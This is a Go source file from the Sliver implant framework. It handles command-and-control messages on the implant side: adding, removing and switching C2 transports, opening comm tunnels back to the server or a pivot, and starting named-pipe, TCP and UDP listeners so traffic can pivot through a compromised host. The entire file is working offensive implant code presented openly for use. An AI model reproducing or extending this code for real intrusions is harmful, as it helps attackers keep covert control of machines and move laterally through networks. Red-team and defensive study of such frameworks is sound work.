package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}

	"log"
	// {{end}}

	"time"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/comm"
	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/commpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// CommHandler - Handler for managing the Comm subsystem
type CommHandler func(*sliverpb.Envelope, *transports.Connection)

// TransportHandler - Handler for managing the implant transports
type TransportHandler func([]byte, handlers.RPCResponse)

var (
	commHandlers      map[uint32]CommHandler      // commHandlers - All actions on the Comm system
	transportHandlers map[uint32]TransportHandler // transportHandlers - All actions on transports
)

// Has avoided a weird initialization loop error in transportSwitchHandler,
// which leads us to the map of C2s, and God knows where after that...
func init() {
	// commHandlers - All actions pertaining to the Comm subsystem
	commHandlers = map[uint32]CommHandler{
		sliverpb.MsgCommTunnelOpenReq: commTunnelHandler,
		sliverpb.MsgCommTunnelData:    commTunnelDataHandler,

		sliverpb.MsgHandlerStartReq: startHandler,
		sliverpb.MsgHandlerCloseReq: closeHandler,
	}

	// commHandlers - All actions pertaining to the Comm subsystem
	transportHandlers = map[uint32]TransportHandler{
		sliverpb.MsgTransportsReq:      c2Handler,
		sliverpb.MsgAddTransportReq:    addTransportHandler,
		sliverpb.MsgDeleteTransportReq: deleteTransportHandler,
		sliverpb.MsgSwitchTransportReq: transportSwitchHandler,
	}
}

// GetCommHandlers - Returns a map of route handlers
func GetCommHandlers() map[uint32]CommHandler {
	return commHandlers
}

// Transports -------------------------------------------------------------------------------------------

func c2Handler(data []byte, resp handlers.RPCResponse) {
	req := &sliverpb.TransportsReq{}
	proto.Unmarshal(data, req)
	res := &sliverpb.Transports{Response: &commonpb.Response{}}

	// Latest statistics for all loaded transports.
	res.Transports = Transports.transportStatistics()
	// Response
	resData, err := proto.Marshal(res)
	resp(resData, err)
}

func addTransportHandler(data []byte, resp handlers.RPCResponse) {
	req := &sliverpb.TransportAddReq{}
	proto.Unmarshal(data, req)
	res := &sliverpb.TransportAdd{Response: &commonpb.Response{}}

	// Instantiate the transport.
	channel, err := InitChannelFromProfile(req.Profile)
	if err != nil {
		res.Success = false
		res.Response.Err = err.Error()
		data, err := proto.Marshal(res)
		resp(data, err)
		return
	}
	channel.Transport().Priority = int(req.Priority)

	// Add to available c2, with the requested order
	Transports.Add(channel)
	res.Success = true

	// Response
	resData, err := proto.Marshal(res)
	resp(resData, err)

	// Switch with the new, if asked to
	if req.Switch {
		err = Transports.Switch(channel.Transport().ID)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport switch error: %s", err.Error())
			// {{end}}
		}
	}
}

func deleteTransportHandler(data []byte, resp handlers.RPCResponse) {
	req := &sliverpb.TransportDeleteReq{}
	proto.Unmarshal(data, req)
	res := &sliverpb.TransportDelete{Response: &commonpb.Response{}}

	Transports.Remove(req.ID)
	res.Success = true

	// Response
	resData, err := proto.Marshal(res)
	resp(resData, err)
}

// transportSwitchHandler - This handler simply receives the transport switch request,
// checks transport is loaded, and sends back success. Only then, it calls the Switch
// implementation, because the latter WILL reach back to the server, either through
// a new Channel (before cutting the old one) or through the old one, in case of failure.
func transportSwitchHandler(data []byte, resp handlers.RPCResponse) {
	req := &sliverpb.TransportSwitchReq{}
	proto.Unmarshal(data, req)
	res := &sliverpb.TransportSwitch{Response: &commonpb.Response{}}

	tp := Transports.Get(req.ID)
	if tp == nil {
		res.Response.Err = "transport not found"
		data, err := proto.Marshal(res)
		resp(data, err)
		return
	}

	// Reset the attempts/failures for this transport.
	// We assume that the user knows the statistics and
	// would taken appropriate action if he should not use it.
	tp.Transport().ResetAttempts()

	// Send the response before doing the switch
	res.Success = true
	resData, err := proto.Marshal(res)
	resp(resData, err)

	err = Transports.Switch(tp.Transport().ID)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Transport switch error: %s", err.Error())
		// {{end}}
	}
}

// Comm Handlers ----------------------------------------------------------------------------------------

// commTunnelHandler - A special handler that receives a Tunnel ID (sent by the server or a pivot)
// and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
// system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	data := &commpb.TunnelOpenReq{}
	proto.Unmarshal(envelope.Data, data)

	// {{if .Config.Debug}}
	log.Printf("[tunnel] Received Comm Tunnel request (ID %d)", data.TunnelID)
	// {{end}}

	// Create and start a Tunnel. It is already wired up to its transports.Connection, thus working.
	tunnel := comm.NewTunnel(data.TunnelID, connection.RequestSend)

	// Comm setup. This is goes on in the background, because we need
	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
	go comm.InitClient(tunnel)

	muxResp, _ := proto.Marshal(&commpb.TunnelOpen{
		Success:  true,
		Response: &commonpb.Response{},
	})
	connection.RequestSend(&sliverpb.Envelope{
		ID:   envelope.ID,
		Data: muxResp,
	})
}

// commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
// and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	data := &commpb.TunnelData{}
	proto.Unmarshal(envelope.Data, data)
	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
	for {
		switch {
		case tunnel != nil:
			tunnel.FromServer <- data
			// {{if .Config.Debug}}
			log.Printf("[tunnel] From server %d bytes", len(data.Data))
			// {{end}}
			return
			// TODO: Maybe return the data back to the implant, marked with non-receive indications.
		default:
			// {{if .Config.Debug}}
			log.Printf("[tunnel] No tunnel found for ID %d (Seq: %d)", data.TunnelID, data.Sequence)
			// {{end}}
			time.Sleep(100 * time.Millisecond) // TODO: check why
			continue
		}
	}
}

// Listener/Dialer Handlers -----------------------------------------------------------------------------

// startHandler - Start a listener/bind handler on this implant. The handler keeps some information
// and will transmit it with the connections it routes back to/forwards from the server.
func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	// Request / Response
	handlerReq := &commpb.HandlerStartReq{}
	err := proto.Unmarshal(envelope.Data, handlerReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	handlerRes := &commpb.HandlerStart{Response: &commonpb.Response{}}

	// The application-layer protocol prevails over the trasport protocol
	switch handlerReq.Handler.Application {
	// Named pipes
	case commpb.Application_NamedPipe:
		// {{if .Config.NamePipec2Enabled}}
		_, err := comm.ListenNamedPipe(handlerReq.Handler) // Adds the listener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true
		// {{end}}
	default:
		goto TRANSPORT
	}

	// Fallback on the transport protocol
TRANSPORT:
	switch handlerReq.Handler.Transport {
	// TCP
	case commpb.Transport_TCP:
		_, err := comm.ListenTCP(handlerReq.Handler) // Adds the listener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true

	// UDP
	case commpb.Transport_UDP:
		err := comm.ListenUDP(handlerReq.Handler) // Adds the lsitener to the jobs.
		if err != nil {
			handlerRes.Success = false
			handlerRes.Response.Err = err.Error()
			break
		}
		handlerRes.Success = true

	default:
	}

	// Response
	data, _ := proto.Marshal(handlerRes)
	connection.RequestSend(&sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	})
}

// closeHandler - Stops/Close a listener on this implant.
func closeHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	// Request / Response
	handlerReq := &commpb.HandlerCloseReq{}
	err := proto.Unmarshal(envelope.Data, handlerReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	handlerRes := &commpb.HandlerClose{Response: &commonpb.Response{}}

	// Call job stop
	err = comm.Listeners.Remove(handlerReq.Handler.ID)
	if err != nil {
		handlerRes.Success = false
		handlerRes.Response.Err = err.Error()
	} else {
		handlerRes.Success = true
	}

	// Response
	data, _ := proto.Marshal(handlerRes)
	connection.RequestSend(&sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	})
}
